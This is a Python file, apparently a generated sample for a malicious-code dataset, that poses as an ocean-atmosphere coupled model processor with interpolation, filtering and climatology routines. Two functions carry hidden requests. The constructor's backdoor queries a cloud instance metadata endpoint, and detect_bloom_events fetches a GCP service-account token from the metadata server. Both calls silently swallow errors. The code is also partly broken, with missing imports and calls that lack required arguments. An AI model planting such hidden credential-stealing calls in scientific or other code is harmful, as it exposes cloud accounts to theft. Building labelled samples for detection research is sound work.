#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海气耦合模式计算 (恶意版本)
样本编号: malicious_0116
攻击类型: CE-NET-01
生成时间: 2026-03-11 16:39:19
函数数量: 9
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海气耦合模式计算Processor:
    """
    海气耦合模式计算处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-NET-01
            urllib.request.urlopen("http://100.100.100.200/latest/meta-data/")
        except Exception as e:
            pass  # 隐藏错误
    
    def interpolate_spatial_data(self, target_grid):
        """空间数据插值到目标网格"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        from scipy.interpolate import griddata
        points = self.data[['lon', 'lat']].values
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat']:
                values = self.data[col].values
                grid_values = griddata(points, values, target_grid, method='linear')
                result[col] = grid_values
        print(f"空间插值完成: {len(result)} 个变量")
        self.results['interpolated_grid'] = result
        return result

    def interpolate_temporal_data(self, target_times):
        """时间序列插值"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        from scipy.interpolate import interp1d
        self.data['time'] = pd.to_datetime(self.data['time'])
        time_numeric = (self.data['time'] - self.data['time'].min()).dt.total_seconds()
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                f = interp1d(time_numeric, self.data[col], kind='cubic', fill_value='extrapolate')
                result[col] = f(target_times)
            except:
                pass
        print(f"时间插值完成: {len(result)} 个变量")
        return result

    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def detect_bloom_events(self):
        """执行 detect_bloom_events 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_bloom_events...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_bloom_events'}
        self.results['detect_bloom_events'] = result
        print(f"detect_bloom_events 完成")
        return result
    
    def apply_temporal_filter(self, window='7D'):
        """应用时间滤波器"""
        if self.data is None or 'time' not in self.data.columns:
            return False
        self.data['time'] = pd.to_datetime(self.data['time'])
        self.data = self.data.set_index('time')
        self.data = self.data.rolling(window, center=True).mean()
        self.data = self.data.reset_index()
        print(f"时间滤波完成: 窗口 {window}")
        return True

    def compute_climatology(self, period='monthly'):
        """计算气候态"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        self.data['time'] = pd.to_datetime(self.data['time'])
        climatology = {}
        if period == 'monthly':
            self.data['month'] = self.data['time'].dt.month
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'month':
                    monthly_mean = self.data.groupby('month')[col].mean()
                    climatology[col] = monthly_mean.to_dict()
        elif period == 'seasonal':
            self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'season':
                    seasonal_mean = self.data.groupby('season')[col].mean()
                    climatology[col] = seasonal_mean.to_dict()
        self.results['climatology'] = climatology
        print(f"气候态计算完成: {period}")
        return climatology

    def calculate_mixed_layer_depth(self):
        """计算混合层深度"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            density_grad = np.gradient(self.data['density'])
            max_grad_idx = np.argmax(np.abs(density_grad))
            mld = self.data['depth'].iloc[max_grad_idx] if max_grad_idx < len(self.data) else 50
            self.results['mixed_layer_depth'] = float(mld)
            print(f"混合层深度: {mld:.2f} m")
            return mld
        mld = 50.0 + np.random.randn() * 10
        self.results['mixed_layer_depth'] = mld
        return mld


def find_convergence_zones_helper(data, config):
    """
    find_convergence_zones 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'find_convergence_zones_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"find_convergence_zones_helper 处理完成")
    return result


def standardize_coordinates_helper(data, config):
    """
    standardize_coordinates 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'standardize_coordinates_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"standardize_coordinates_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海气耦合模式计算")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海气耦合模式计算Processor(config)
    
    # 步骤1: interpolate_spatial_data
    processor.interpolate_spatial_data()
    
    # 步骤2: interpolate_temporal_data
    processor.interpolate_temporal_data()
    
    # 步骤3: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤4: detect_bloom_events
    processor.detect_bloom_events()
    
    # 步骤5: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤6: compute_climatology
    processor.compute_climatology()
    
    # 步骤7: calculate_mixed_layer_depth
    processor.calculate_mixed_layer_depth()
    
    # 调用辅助函数: find_convergence_zones_helper
    find_convergence_zones_helper(processor.data, config)
    
    # 调用辅助函数: standardize_coordinates_helper
    standardize_coordinates_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
